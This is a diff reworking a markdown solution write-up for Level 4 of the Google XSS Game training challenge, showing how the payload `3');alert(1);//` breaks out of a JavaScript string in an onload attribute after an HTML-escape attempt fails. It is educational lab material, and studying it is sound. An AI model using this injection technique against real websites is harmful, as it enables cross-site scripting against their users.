@@ -1,80 +1,88 @@
-```markdown
-### 🧪 Google XSS Game - Level 4
-
-#### 🎯 Mission Description
-Every piece of user-supplied data must be properly escaped depending on the context it's placed in. This level shows why that matters.
-
-#### 🎯 Mission Objective
-Inject JavaScript code that triggers an `alert()` popup.
-
-```
-### 🪜 Steps
-
-- We checked the source code and found this line:
-
-  ```html
-  <img src="/static/loading.gif" onload="startTimer('3');" />
-  
-
-- This is where we’ll inject our payload — specifically inside the `onload` attribute.
-
-- First attempt was:
-
-  ```
-  X">x
-  ```
-
-  Which resulted in:
-
-  ```html
-  <img src="/static/loading.gif" onload="startTimer('X&quot;&gt;x');" />
-  ```
-
-  So the special characters were escaped, and the attempt failed.
-
-- Instead, we decided to break the `startTimer()` function itself and inject our code inside the JavaScript context.
-
-- First, we closed the string and function with:
-
-  ```
-  3');
-  ```
-
-- Then injected:
-
-  ```
-  alert(1);
-  ```
-
-- And finally closed off the rest of the line using:
-
-  ```
-  //
-  ```
+# Google XSS Game – Level 4: JavaScript Context Injection
 
 ---
 
-### 💣 Final Payload
+## 🎯 Mission Description  
+User input must be properly escaped depending on the context it’s inserted into.  
+This level demonstrates how dangerous it can be when input is injected **directly into JavaScript code** — not just HTML.
 
-```
+---
+
+## 🎯 Mission Objective  
+Inject a script that triggers `alert(1)` inside the app.  
+✅ The injection point is **inside a JavaScript function parameter**, not regular HTML.
+
+---
+
+## 🧪 Steps (My Approach)
+
+1. 🔍 Viewed the source code and found:
+
+   ```html
+   <img src="/static/loading.gif" onload="startTimer('3');" />
+   ```
+
+   → The value `3` is passed as a string to the `startTimer()` function.  
+   → This is our injection point.
+
+---
+
+2. ❌ First try: inject HTML special chars
+
+   ```
+   X">x
+   ```
+
+   Result:
+
+   ```html
+   <img src="/static/loading.gif" onload="startTimer('X&quot;&gt;x');" />
+   ```
+
+   → The characters were escaped. HTML injection blocked.
+
+---
+
+3. ✅ New idea: inject inside the JavaScript function
+
+   - Close the string and function call:
+     ```
+     3');
+     ```
+
+   - Inject the payload:
+     ```
+     alert(1);
+     ```
+
+   - Comment out the rest:
+     ```
+     //
+     ```
+
+---
+
+## ✅ Final Payload
+
+```javascript
 3');alert(1);//
 ```
 
-And it gets rendered as:
+🔎 Which results in:
 
 ```html
 <img src="/static/loading.gif" onload="startTimer('3');alert(1);//');" />
 ```
 
----
-
-### 🧠 Notes
-
-- This is an example of XSS within JavaScript context.
-- You don’t always need to break out of an HTML attribute — sometimes injecting inside the script logic itself is more effective.
-- Always analyze the context of the injection point before crafting your payload.
+💥 `alert(1)` gets executed — mission complete!
 
 ---
 
-**Status: Solved ✅**
+## 🧠 Notes  
+- This is a **JavaScript context XSS**, not HTML.  
+- Injection point is inside a JS string → need to **close the string properly** before injecting.  
+- No need to break out of HTML attributes — just craft smart payloads within the JS.
 
+---
+
+## ✅ Status: Solved 🎉
